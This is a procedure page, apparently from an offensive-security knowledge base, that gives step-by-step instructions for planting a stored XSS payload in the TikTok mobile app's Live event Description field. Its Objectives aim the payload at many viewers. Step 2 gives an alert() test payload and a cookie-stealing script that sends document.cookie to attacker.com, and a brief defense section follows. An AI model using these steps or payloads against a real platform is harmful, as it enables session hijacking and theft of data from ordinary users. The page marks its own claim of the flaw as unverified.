---
id: proc-tiktok-inject-xss-payload
tags:
  - xss
  - stored-xss
  - injection
  - tiktok
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Mobile App
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-13T23:55:37.768Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-into-TikTok-Live-Description

## Summary

This procedure exploits insufficient sanitization in the TikTok mobile app's Live event creation form by injecting a malicious JavaScript payload into the Description field, storing it server-side for later execution when viewed by other users.

## Description

In the context of the TikTok mobile app, authenticated users can create Live events via a restricted endpoint. The Description field accepts user input without proper escaping or validation, allowing HTML and JavaScript tags to be stored and rendered as-is. This leads to stored XSS, where the payload executes in the viewer's app context, potentially enabling session hijacking, phishing, or data theft. Prerequisites include a valid TikTok account with Live creation permissions.

## Requirements

1. Authenticated TikTok mobile app account with access to Live features
2. Mobile device running TikTok app (Android or iOS)
3. Internet connectivity to submit the event

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding for user-generated content (e.g., using libraries like DOMPurify)
- Content Security Policy (CSP) to restrict script execution in WebViews
- Monitor for anomalous JavaScript execution or unexpected network requests from the app

## Objectives

1. Store malicious payload in the Live event Description to persist across sessions
2. Ensure payload survives backend storage and frontend rendering
3. Set up for execution impacting multiple users viewing the event

## Instructions

### Step 1: Access Live Event Creation

**Context**: Log in to the TikTok app and navigate to the Live creation interface to prepare for payload injection.

Open the TikTok app, tap the '+' icon, select 'LIVE', and proceed to the event setup screen. Ensure you have the necessary permissions for Live streaming.

### Step 2: Inject Payload into Description Field

**Context**: Enter the malicious payload directly into the Description field, targeting the lack of sanitization in the restricted creation endpoint.

In the Description input box, enter a payload such as:

```html
<script>alert('Stored XSS in TikTok Live');</script>
```

For more impactful attacks, use:

```html
<script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>
```

Submit the Live event creation form.

> The payload is sent to the backend endpoint without validation, stored, and associated with the event.

### Step 3: Verify Injection

**Context**: Confirm the payload is stored by previewing or saving the event.

After submission, check the event details in the app to ensure the Description reflects the injected content unaltered.

**Expected Output**: Event created successfully with payload visible in Description.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- xss
- stored-xss
- tiktok
- mobile
